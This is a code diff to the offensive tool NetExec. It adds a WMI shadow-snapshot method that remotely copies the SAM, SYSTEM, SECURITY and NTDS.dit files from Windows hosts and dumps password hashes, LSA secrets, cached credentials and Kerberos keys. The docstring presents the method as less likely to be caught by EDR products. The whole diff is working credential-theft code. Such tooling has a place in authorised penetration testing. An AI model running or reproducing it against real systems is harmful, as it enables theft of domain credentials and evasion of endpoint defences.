@@ -15,6 +15,7 @@ from impacket.examples.secretsdump import (
     SAMHashes,
     LSASecrets,
     NTDSHashes,
+    LocalOperations,
 )
 from impacket.examples.regsecrets import (
     RemoteOperations as RegSecretsRemoteOperations,
@@ -70,6 +71,7 @@ from nxc.protocols.smb.passpol import PassPolDump
 from nxc.protocols.smb.samruser import UserSamrDump
 from nxc.protocols.smb.samrfunc import SamrFunc
 from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
+from nxc.paths import TMP_PATH
 from nxc.helpers.logger import highlight
 from nxc.helpers.bloodhound import add_user_bh
 from nxc.helpers.rpc import NXCRPCConnection
@@ -2179,10 +2181,74 @@ class smb(connection):
         except Exception as e:
             self.logger.fail(f"RemoteOperations failed: {e}")
 
+    def _sswmi_download(self):
+        """Create a remote Shadow Snapshot via WMI and download SAM, SYSTEM and SECURITY (and NTDS.dit if needed) from it.
+
+        Uses impacket's RemoteOperations.createSSandDownloadWMI (the '-use-remoteSSWMI' approach of
+        secretsdump.py): a Shadow Snapshot is created through DCOM WMI (Win32_ShadowCopy) and the hives
+        are read back over SMB from the snapshot. No code execution, no service creation and no 'reg save'
+        on the target, which makes this method less likely to be caught by EDRs than 'regdump'/'secdump'/'vss'.
+
+        The downloaded files are cached on the instance so that a single snapshot is used when several of
+        --sam/--lsa/--ntds are combined with the 'sswmi' method.
+        """
+        if getattr(self, "_sswmi_files", None) is None:
+            import tempfile
+
+            download_dir = tempfile.mkdtemp(prefix="nxc_sswmi_", dir=TMP_PATH)
+            try:
+                remote_ops = RemoteOperations(self.conn, self.kerberos, self.kdcHost)
+                self.logger.display(f"Creating remote Shadow Snapshot on {self.args.sswmi_volume} via WMI and downloading hives")
+                sam_path, system_path, security_path, *ntds_paths = remote_ops.createSSandDownloadWMI(
+                    self.args.sswmi_volume,
+                    download_dir,
+                    self.args.ntds == "sswmi",
+                )
+            except Exception:
+                import shutil
+
+                shutil.rmtree(download_dir, ignore_errors=True)
+                raise
+            self._sswmi_files = {
+                "sam": sam_path,
+                "system": system_path,
+                "security": security_path,
+                "ntds": ntds_paths[0] if ntds_paths else None,
+            }
+            self._sswmi_download_dir = download_dir
+            self._sswmi_consumed = set()
+            import atexit
+
+            atexit.register(self._sswmi_cleanup)
+            self.logger.success(f"Shadow Snapshot downloaded to {download_dir}")
+
+        return self._sswmi_files
+
+    def _sswmi_finish(self, flag):
+        """Remove the downloaded hives once every 'sswmi' flagged method has consumed them."""
+        if getattr(self, "_sswmi_consumed", None) is None:
+            return
+        self._sswmi_consumed.add(flag)
+        sswmi_flags = {f for f in ("sam", "lsa", "ntds") if getattr(self.args, f, None) == "sswmi"}
+        if self._sswmi_consumed >= sswmi_flags:
+            import shutil
+
+            shutil.rmtree(self._sswmi_download_dir, ignore_errors=True)
+            self.logger.debug(f"Removed temporary Shadow Snapshot download dir {self._sswmi_download_dir}")
+
+    def _sswmi_cleanup(self):
+        """Remove the downloaded hives after an error, so no sensitive files are left behind."""
+        if getattr(self, "_sswmi_download_dir", None) is not None:
+            import shutil
+
+            shutil.rmtree(self._sswmi_download_dir, ignore_errors=True)
+            self.logger.debug(f"Removed temporary Shadow Snapshot download dir {self._sswmi_download_dir} (error path)")
+
     @requires_admin
     def sam(self):
         try:
-            self.enable_remoteops(regsecret=(self.args.sam == "regdump"))
+            if self.args.sam != "sswmi":
+                self.enable_remoteops(regsecret=(self.args.sam == "regdump"))
             host_id = self.db.get_hosts(filter_term=self.host)[0][0]
 
             def add_sam_hash(sam_hash, host_id):
@@ -2200,6 +2266,25 @@ class smb(connection):
                 add_sam_hash.sam_hashes += 1
 
             add_sam_hash.sam_hashes = 0
+
+            if self.args.sam == "sswmi":
+                self.output_filename = self.output_file_template.format(output_folder="sam")
+                files = self._sswmi_download()
+                local_operations = LocalOperations(files["system"])
+                boot_key = local_operations.getBootKey()
+                SAM = SAMHashes(
+                    files["sam"],
+                    boot_key,
+                    isRemote=False,
+                    history=self.args.history,
+                    perSecretCallback=lambda secret: add_sam_hash(secret, host_id),
+                )
+                self.logger.display("Dumping SAM hashes")
+                SAM.dump()
+                SAM.export(self.output_filename)
+                self.logger.success(f"Added {highlight(add_sam_hash.sam_hashes)} SAM hashes to the database")
+                self._sswmi_finish("sam")
+                return
 
             if self.remote_ops and self.bootkey:
                 if self.args.sam == "regdump":
@@ -2235,8 +2320,10 @@ class smb(connection):
         except SessionError as e:
             if "STATUS_ACCESS_DENIED" in e.getErrorString():
                 self.logger.fail('Error "STATUS_ACCESS_DENIED" while dumping SAM. This is likely due to an endpoint protection.')
+            self._sswmi_cleanup()
         except Exception as e:
             self.logger.exception(str(e))
+            self._sswmi_cleanup()
 
     @requires_admin
     def sccm(self):
@@ -2507,7 +2594,8 @@ class smb(connection):
     @requires_admin
     def lsa(self):
         try:
-            self.enable_remoteops(regsecret=(self.args.lsa == "regdump"))
+            if self.args.lsa != "sswmi":
+                self.enable_remoteops(regsecret=(self.args.lsa == "regdump"))
 
             def add_lsa_secret(secret):
                 add_lsa_secret.secrets += 1
@@ -2524,6 +2612,27 @@ class smb(connection):
                     self.logger.highlight(f"GMSA ID: {gmsa_id:<20} NTLM: {passwd}")
 
             add_lsa_secret.secrets = 0
+
+            if self.args.lsa == "sswmi":
+                self.output_filename = self.output_file_template.format(output_folder="lsa")
+                files = self._sswmi_download()
+                local_operations = LocalOperations(files["system"])
+                boot_key = local_operations.getBootKey()
+                LSA = LSASecrets(
+                    files["security"],
+                    boot_key,
+                    None,
+                    isRemote=False,
+                    perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
+                )
+                self.logger.display("Dumping LSA secrets")
+                LSA.dumpCachedHashes()
+                LSA.exportCached(self.output_filename)
+                LSA.dumpSecrets()
+                LSA.exportSecrets(self.output_filename)
+                self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {self.output_filename + '.secrets'} and {self.output_filename + '.cached'}")
+                self._sswmi_finish("lsa")
+                return
 
             if self.remote_ops and self.bootkey:
                 if self.args.lsa == "regdump":
@@ -2557,11 +2666,14 @@ class smb(connection):
         except SessionError as e:
             if "STATUS_ACCESS_DENIED" in e.getErrorString():
                 self.logger.fail('Error "STATUS_ACCESS_DENIED" while dumping LSA. This is likely due to an endpoint protection.')
+            self._sswmi_cleanup()
         except Exception as e:
             self.logger.exception(str(e))
+            self._sswmi_cleanup()
 
     def ntds(self):
-        self.enable_remoteops()
+        if self.args.ntds != "sswmi":
+            self.enable_remoteops()
         use_vss_method = False
         NTDSFileName = None
         host_id = self.db.get_hosts(filter_term=self.host)[0][0]
@@ -2612,6 +2724,44 @@ class smb(connection):
         add_hash.nt_lm_secrets = 0
         add_hash.kerb_secrets = 0
         add_hash.added_to_db = 0
+
+        if self.args.ntds == "sswmi":
+            self.output_filename = self.output_file_template.format(output_folder="ntds")
+            try:
+                files = self._sswmi_download()
+                local_operations = LocalOperations(files["system"])
+                boot_key = local_operations.getBootKey()
+                no_lm_hash = local_operations.checkNoLMHashPolicy()
+
+                NTDS = NTDSHashes(
+                    files["ntds"],
+                    boot_key,
+                    isRemote=False,
+                    history=self.args.history,
+                    noLMHash=no_lm_hash,
+                    remoteOps=None,
+                    useVSSMethod=True,
+                    justNTLM=not self.args.kerberos_keys,
+                    pwdLastSet=False,
+                    resumeSession=None,
+                    outputFileName=self.output_filename,
+                    justUser=self.args.userntds if self.args.userntds else None,
+                    printUserStatus=True,
+                    perSecretCallback=lambda secret_type, secret: add_hash(secret_type, secret, host_id),
+                )
+                self.logger.success("Dumping the NTDS, this could take a while so go grab a redbull...")
+                NTDS.dump()
+                ntds_outfile = f"{self.output_filename}.ntds"
+                self.logger.success(f"Dumped {highlight(add_hash.nt_lm_secrets)} NTDS hashes to {ntds_outfile} of which {highlight(add_hash.added_to_db)} were added to the database")
+                if self.args.kerberos_keys:
+                    self.logger.success(f"Dumped {highlight(add_hash.kerb_secrets)} Kerberos keys to {ntds_outfile}.kerberos")
+                self.logger.display("To extract only enabled accounts from the output file, run the following command: ")
+                self.logger.display(f"grep -iv disabled {ntds_outfile} | cut -d ':' -f1")
+            except Exception as e:
+                self.logger.fail(e)
+                self._sswmi_cleanup()
+            self._sswmi_finish("ntds")
+            return
 
         if self.remote_ops:
             try:
